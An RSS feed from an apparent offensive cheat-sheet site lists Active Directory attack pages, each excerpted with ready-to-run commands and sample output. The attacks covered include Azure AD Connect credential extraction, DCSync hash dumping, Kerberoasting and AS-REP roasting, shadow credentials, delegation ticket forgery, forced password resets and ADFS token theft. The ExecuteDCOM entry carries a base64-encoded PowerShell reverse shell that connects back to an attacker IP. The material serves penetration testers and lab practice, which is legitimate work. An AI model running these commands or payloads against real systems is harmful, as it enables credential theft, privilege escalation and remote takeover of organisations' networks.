<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Active Directory on TLDRBins</title>
    <link>https://tldrbins.github.io/@active-directory/</link>
    <description>Recent content in Active Directory on TLDRBins</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 21 Feb 2025 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://tldrbins.github.io/@active-directory/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Azure AD Connect</title>
      <link>https://tldrbins.github.io/azure_ad/</link>
      <pubDate>Fri, 21 Feb 2025 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/azure_ad/</guid>
      <description>Abuse #1: Azure AD Connect Password Extraction Windows 1. Start ADSync Service Set-Service -name adsync -StartupType automatic Set-Service -name adsync -status running -passthru Set-Service -name adsync -status running -passthru WARNING: Waiting for service &amp;#39;Microsoft Azure AD Sync (adsync)&amp;#39; to start... Status Name DisplayName ------ ---- ----------- Running adsync Microsoft Azure AD Sync 2. Download ADSync.mdf and ADSync_log.LDF python3 adconnectdump.py &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt; -hashes :&amp;lt;HASH&amp;gt; $ python3 adconnectdump.py SRV001/Administrator@srv001.example.local -hashes :7ddf32e17a6ac5ce04a8ecbf782ca509 Azure AD Connect remote credential dumper - by @_dirkjan [*] Stopping service ADSync [*] Downloading ADSync database files [*] Starting service ADSync [*] Querying database for configuration data [-] RemoteOperations failed: [Errno 2] No such file or directory: &amp;#39;ADSyncQuery.</description>
    </item>
    <item>
      <title>Unconstrained Delegation</title>
      <link>https://tldrbins.github.io/unconstrained_delegation/</link>
      <pubDate>Sat, 23 Nov 2024 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/unconstrained_delegation/</guid>
      <description>Abuse #1: Capture Ticket Windows 1. Check TRUSTED_FOR_DELEGATION . .\PowerView.ps1 Get-DomainComputer PS C:\programdata&amp;gt; Get-DomainComputer ---[SNIP]--- logoncount : 131 badpasswordtime : 12/31/1600 4:00:00 PM distinguishedname : CN=SRV002,CN=Computers,DC=Example,DC=local objectclass : {top, person, organizationalPerson, user...} badpwdcount : 0 displayname : SRV002$ lastlogontimestamp : 11/23/2024 2:29:01 AM objectsid : S-1-5-21-422340810-923920092-1608110645-1103 samaccountname : SRV002$ localpolicyflags : 0 codepage : 0 samaccounttype : MACHINE_ACCOUNT countrycode : 0 cn : SRV002 accountexpires : NEVER whenchanged : 11/23/2024 2:26:27 PM instancetype : 4 usncreated : 16398 objectguid : e54dc358-b87f-49ad-8bcf-2029bf051006 operatingsystem : Windows Server 2019 Standard operatingsystemversion : 10.</description>
    </item>
    <item>
      <title>Abuse Parent Child Domain Trusts</title>
      <link>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</guid>
      <description>Privesc from DA (Domain Admin) to EA (Enterprise Admin) Windows 1. Check trust relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * PS C:\Windows\system32&amp;gt; Get-ADTrust -Filter * Direction : BiDirectional DisallowTransivity : False DistinguishedName : CN=example.com,CN=System,DC=corp,DC=example,DC=com ForestTransitive : False IntraForest : True IsTreeParent : False IsTreeRoot : False Name : example.com ObjectClass : trustedDomain ObjectGUID : b0c64079-6f51-4516-9a62-90f94666bfc1 SelectiveAuthentication : False SIDFilteringForestAware : False SIDFilteringQuarantined : False Source : DC=corp,DC=example,DC=com Target : example.</description>
    </item>
    <item>
      <title>Account Operators</title>
      <link>https://tldrbins.github.io/account_operators/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/account_operators/</guid>
      <description>Privesc #1: Create a new user account and add it to LAPS (Local Administrator Password Solution) group Windows 1. Import PowerView.ps1 . .\PowerView.ps1 *Evil-WinRM* PS C:\programdata&amp;gt; . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Create a new user password object $new_user_password = ConvertTo-SecureString &amp;#39;&amp;lt;NEW_USER_PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force *Evil-WinRM* PS C:\programdata&amp;gt; $new_user_password = ConvertTo-SecureString &amp;#39;Test1234&amp;#39; -AsPlainText -Force 4.</description>
    </item>
    <item>
      <title>AD Recycle Bin</title>
      <link>https://tldrbins.github.io/ad_recycle_bin/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/ad_recycle_bin/</guid>
      <description>Privesc #1: Restore Deleted AD Object Windows 1. Import AD Module Import-Module activedirectory *Evil-WinRM* PS C:\Users\test.user\Documents&amp;gt; import-module activedirectory 2. Query All Deleted Objects within Domain Get-ADObject -filter &amp;#39;isDeleted -eq $true -and name -ne &amp;#34;Deleted Objects&amp;#34;&amp;#39; -includeDeletedObjects *Evil-WinRM* PS C:\Users\test.user\Documents&amp;gt; Get-ADObject -filter &amp;#39;isDeleted -eq $true -and name -ne &amp;#34;Deleted Objects&amp;#34;&amp;#39; -includeDeletedObjects Deleted : True DistinguishedName : CN=Another User\0ADEL:ebe15df5-e265-45ec-b7fc-359877217138,CN=Deleted Objects,DC=example,DC=com Name : Another User DEL:ebe15df5-e265-45ec-b7fc-359877217138 ObjectClass : user ObjectGUID : ebe15df5-e265-45ec-b7fc-359877217138 3. Get All Details for the Deleted Object Get-ADObject -filter { SAMAccountName -eq &amp;#39;&amp;lt;DELETED_USER&amp;gt;&amp;#39; } -includeDeletedObjects -property * *Evil-WinRM* PS C:\Users\test.</description>
    </item>
    <item>
      <title>ADCS</title>
      <link>https://tldrbins.github.io/adcs/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/adcs/</guid>
      <description>Enum (From Linux) certipy-ad nxc # Password certipy-ad find -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable # NTLM certipy-ad find -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -hashes &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable # Password nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -M adcs # NTLM nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -H &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; -M adcs Enum (From Windows) powershell certify ADCSTemplate # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates # Get info of each template .</description>
    </item>
    <item>
      <title>AddKeyCredentialLink</title>
      <link>https://tldrbins.github.io/addkeycredentiallink/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/addkeycredentiallink/</guid>
      <description>Privesc #1: Shadow Credential (From Linux) pywhisker certipy-ad 0. Pre-Check [Optional] # Password python3 pywhisker.py -t &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; --action list -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --dc-ip &amp;lt;DC_IP&amp;gt; --use-ldaps $ python3 pywhisker.py --action list -d outdated.htb -u &amp;#39;btables&amp;#39; -p &amp;#39;5myBPLPDKT3Bfq&amp;#39; --dc-ip 10.10.11.175 -t &amp;#39;sflowers&amp;#39; --use-ldaps [*] Searching for the target account [*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb [*] Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that attribute # NTLM python3 pywhisker.</description>
    </item>
    <item>
      <title>AddMember</title>
      <link>https://tldrbins.github.io/addmember/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/addmember/</guid>
      <description>Privesc #1: Add User to Group (From Linux) bloodyAD powerview.py 1. Add User to Group # With password bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; --dc-ip &amp;lt;DC_IP&amp;gt; add groupMember &amp;#39;&amp;lt;GROUP&amp;gt;&amp;#39; &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; # With Kerberos bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -k --host &amp;lt;DC&amp;gt; --dc-ip &amp;lt;DC_IP&amp;gt; add groupMember &amp;#39;&amp;lt;GROUP&amp;gt;&amp;#39; &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; Ref: bloodyAD&#xA;1. Connect # With password sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; powerview &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; $ sudo ntpdate -s dc01.rebound.htb &amp;amp;&amp;amp; powerview &amp;#39;rebound.</description>
    </item>
    <item>
      <title>AddSelf</title>
      <link>https://tldrbins.github.io/addself/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/addself/</guid>
      <description>Privesc #1: Add Self to Group (From Linux) bloodyAD powerview.py 1. Add Self to Group # Password bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; add groupMember &amp;#39;&amp;lt;GROUP&amp;gt;&amp;#39; &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; $ bloodyAD -d rebound.htb -u &amp;#39;oorend&amp;#39; -p &amp;#39;1GR8t@$$4u&amp;#39; --host 10.10.11.231 add groupMember SERVICEMGMT &amp;#39;oorend&amp;#39; [+] oorend added to SERVICEMGMT # NTLM bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; -f rc4 -k --host &amp;lt;DC&amp;gt; add groupMember &amp;#39;&amp;lt;GROUP&amp;gt;&amp;#39; &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; # Kerberos bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -k --host &amp;lt;DC&amp;gt; add groupMember &amp;#39;&amp;lt;GROUP&amp;gt;&amp;#39; &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; $ bloodyAD -d absolute.</description>
    </item>
    <item>
      <title>ADFS</title>
      <link>https://tldrbins.github.io/adfs/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/adfs/</guid>
      <description>Abuse #1: Generate a SAML 2.0 token for some app Windows 1. Dump encrypted PFX and DKM key # With ADFS service account .\ADFSDump.exe *Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents&amp;gt; .\ADFSDump.exe ___ ____ ___________ ____ / | / __ \/ ____/ ___// __ \__ ______ ___ ____ / /| | / / / / /_ \__ \/ / / / / / / __ `__ \/ __ \ / ___ |/ /_/ / __/ ___/ / /_/ / /_/ / / / / / / /_/ / /_/ |_/_____/_/ /____/_____/\__,_/_/ /_/ /_/ .</description>
    </item>
    <item>
      <title>ADIDNS</title>
      <link>https://tldrbins.github.io/adidns/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/adidns/</guid>
      <description>Basic Linux Windows 1. DNS Dump # Password bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; get dnsDump # NTLM bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;:&amp;lt;HASH&amp;gt;&amp;#39; -f rc4 --host &amp;lt;DC&amp;gt; get dnsDump # Kerberos bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -k --host &amp;lt;DC&amp;gt; get dnsDump 1. Import Module . .\Powermad.ps1 2. Enum # Get ADIDNS Zone Get-ADIDNSZone # Get ADIDNS Permissions Get-ADIDNSPermission # Remove a Node Remove-ADIDNSNode -Node * Abuse #1: ADIDNS Poisoning Linux Windows 1.</description>
    </item>
    <item>
      <title>AllowedToDelegate</title>
      <link>https://tldrbins.github.io/allowedtodelegate/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/allowedtodelegate/</guid>
      <description>Privesc #1: Forge a Ticket Linux Windows 1. Pre-Check # With password impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; # With hash impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -no-pass 2. Get a Service Ticket sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; impacket-getST -dc-ip &amp;lt;DC_IP&amp;gt; -spn &amp;#39;&amp;lt;SERVICE&amp;gt;/&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -impersonate &amp;#39;&amp;lt;IMPERSONATE_USER&amp;gt;&amp;#39; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; $ sudo ntpdate -s dc.intelligence.htb &amp;amp;&amp;amp; impacket-getST -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :80d4ea8c2d5ccfd1ebac5bd732ece5e4 -impersonate Administrator &amp;#39;intelligence.htb/svc_int&amp;#39; Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [-] CCache file is not found.</description>
    </item>
    <item>
      <title>Bloodhound</title>
      <link>https://tldrbins.github.io/bloodhound/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/bloodhound/</guid>
      <description>Info Collection (From Linux) bloodhound-python nxc certipy-ad # Password bloodhound-python -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc &amp;lt;DC&amp;gt; -ns &amp;lt;DC_IP&amp;gt; -c all --zip $ python3 bloodhound.py -d rebound.htb -u oorend -p &amp;#39;1GR8t@$$4u&amp;#39; -dc dc01.rebound.htb -ns 10.10.11.231 -c all --zip INFO: Found AD domain: rebound.htb INFO: Getting TGT for user INFO: Connecting to LDAP server: dc01.rebound.htb WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead.</description>
    </item>
    <item>
      <title>Constrained Delegation</title>
      <link>https://tldrbins.github.io/constrained_delegation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/constrained_delegation/</guid>
      <description>Linux 1. Find Delegation # Password sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -k -no-pass -dc-ip &amp;lt;DC&amp;gt; # NTLM sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -no-pass -dc-ip &amp;lt;DC&amp;gt; $ sudo ntpdate -s dc01.rebound.htb &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;rebound.htb/delegator$&amp;#39; -dc-ip dc01.rebound.htb -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 -k -no-pass Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies [*] Getting machine hostname [-] CCache file is not found. Skipping... [-] CCache file is not found.</description>
    </item>
    <item>
      <title>Cross Session Relay</title>
      <link>https://tldrbins.github.io/cross_session_relay/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/cross_session_relay/</guid>
      <description>Display information about the session host Windows qwinsta * # Or runas .\RunasCs.exe x x qwinsta -l 9 *Evil-WinRM* PS C:\Users\winrm_svc\Documents&amp;gt; .\RunasCs.exe x x qwinsta -l 9 SESSIONNAME USERNAME ID STATE TYPE DEVICE &amp;gt;services 0 Disc console tbrady 1 Active Abuse #1: Steal NTLM hash RemotePotato0 KrbRelay 1. Redirect auth request back to target # In local Linux sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:&amp;lt;TARGET&amp;gt;:&amp;lt;RELAY_PORT&amp;gt; $ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999 2. Trigger auth request .</description>
    </item>
    <item>
      <title>ExecuteDCOM</title>
      <link>https://tldrbins.github.io/executedcom/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/executedcom/</guid>
      <description>Abuse #1: ExecuteDCOM Linux # Revshell impacket-dcomexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; &amp;#39;&amp;lt;POWERSHELL_3_BASE64&amp;gt;&amp;#39; -silentcommand -object MMC20 $ impacket-dcomexec jab.htb/svc_openfire:&amp;#39;!@#$%^&amp;amp;*(1qazxsw&amp;#39;@10.10.11.4 &amp;#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAxACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=&amp;#39; -silentcommand -object MMC20 Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra </description>
    </item>
    <item>
      <title>ForceChangePassword</title>
      <link>https://tldrbins.github.io/forcechangepassword/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/forcechangepassword/</guid>
      <description>Change Target User Password (From Linux) BloodyAD rpcclient # Password bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; set password &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; &amp;#39;&amp;lt;NEW_PASSWORD&amp;gt;&amp;#39; bloodyAD -d object.local -u oliver -p &amp;#39;c1cdfun_d2434&amp;#39; --host jenkins.object.local set password smith &amp;#39;Test1234&amp;#39; [+] Password changed successfully! # NTLM bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;:&amp;lt;HASH&amp;gt;&amp;#39; -f rc4 --host &amp;lt;DC&amp;gt; set password &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; &amp;#39;&amp;lt;NEW_PASSWORD&amp;gt;&amp;#39; # Kerberos bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -k --host &amp;lt;DC&amp;gt; set password &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; &amp;#39;&amp;lt;NEW_PASSWORD&amp;gt;&amp;#39; Ref: bloodyAD</description>
    </item>
    <item>
      <title>GenericAll</title>
      <link>https://tldrbins.github.io/genericall/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/genericall/</guid>
      <description>Abuse #1: Change Target User Password Linux Windows 1. Add Full Control to Current User [Optional] impacket bloodyAD&#xA;# Kerberos sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; impacket-dacledit &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -k -dc-ip &amp;lt;DC&amp;gt; -principal &amp;lt;USER&amp;gt; -target-dn &amp;#39;OU=&amp;lt;TARGET_GROUP&amp;gt;,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; -inheritance -action write -rights FullControl -use-ldaps $ sudo ntpdate -s 10.129.232.31 &amp;amp;&amp;amp; impacket-dacledit &amp;#39;REBOUND.HTB/oorend:1GR8t@$$4u&amp;#39; -k -dc-ip DC01.REBOUND.HTB -principal oorend -target-dn &amp;#39;OU=SERVICE USERS,DC=REBOUND,DC=HTB&amp;#39; -inheritance -action write -rights FullControl -use-ldaps Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [-] CCache file is not found.</description>
    </item>
    <item>
      <title>GenericWrite</title>
      <link>https://tldrbins.github.io/genericwrite/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/genericwrite/</guid>
      <description>Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to Target User Linux Windows 1. Enable Account [Optional] sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; bloodyAD --host &amp;lt;DC&amp;gt; -d &amp;#34;&amp;lt;DOMAIN&amp;gt;&amp;#34; --dc-ip &amp;lt;DC_IP&amp;gt; -k remove uac &amp;lt;TARGET_USER&amp;gt; -f ACCOUNTDISABLE 2. Add UF_DONT_REQUIRE_PREAUTH bit sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; bloodyAD --host &amp;lt;DC&amp;gt; -d &amp;#34;&amp;lt;DOMAIN&amp;gt;&amp;#34; --dc-ip &amp;lt;DC_IP&amp;gt; -k add uac &amp;lt;TARGET_USER&amp;gt; -f DONT_REQ_PREAUTH 1. Import PowerView . .\PowerView.ps1 PS C:\programdata&amp;gt; . .\PowerView.ps1 . .\PowerView.ps1 2. Check Target User Get-DomainUser &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; | ConvertFrom-UACValue PS C:\programdata&amp;gt; Get-DomainUser &amp;#39;user&amp;#39; | ConvertFrom-UACValue Get-DomainUser &amp;#39;user&amp;#39; | ConvertFrom-UACValue Name Value ---- ----- NORMAL_ACCOUNT 512 3.</description>
    </item>
    <item>
      <title>GetChanges/GetChangesAll</title>
      <link>https://tldrbins.github.io/getchanges_getchangesall/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/getchanges_getchangesall/</guid>
      <description>Abuse #1: DCSync Attack Linux Windows # With creds impacket-secretsdump -just-dc &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; $ impacket-secretsdump -just-dc &amp;#39;mrlky:Football#7@10.10.10.103&amp;#39; Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8::: ---[SNIP]--- [*] Cleaning up... # With hashes impacket-secretsdump -hashes :&amp;lt;HASH&amp;gt; -just-dc &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; $ impacket-secretsdump -hashes :bceef4f6fe9c026d1d8dec8dce48adef -just-dc &amp;#39;sizzle.htb/mrlky@10.10.10.103&amp;#39; Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.</description>
    </item>
    <item>
      <title>Kerberoasting</title>
      <link>https://tldrbins.github.io/roasting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/roasting/</guid>
      <description>AS_REP Roasting Impacket nxc # Multiple valid usernames impacket-GetNPUsers &amp;lt;DOMAIN&amp;gt;/ -usersfile &amp;lt;USERS_FILE&amp;gt; -no-pass -dc-ip &amp;lt;DC_IP&amp;gt; $ impacket-GetNPUsers ABSOLUTE.HTB/ -usersfile valid_usernames.txt -no-pass -dc-ip DC.ABSOLUTE.HTB Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies [-] User j.roberts doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User m.chaffrey doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User s.osvald doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$23$d.klay@ABSOLUTE.HTB:85554d22d5c220d8a757ce9913d207ea$7288c91ca ---[SNIP]--- 0e09c5d9d1 [-] User j.robinson doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User n.smith doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set # Single user without creds impacket-GetNPUsers -no-pass -dc-ip &amp;lt;DC_IP&amp;gt; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; $ impacket-GetNPUsers -no-pass -dc-ip 10.</description>
    </item>
    <item>
      <title>Kerberos</title>
      <link>https://tldrbins.github.io/kerberos/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
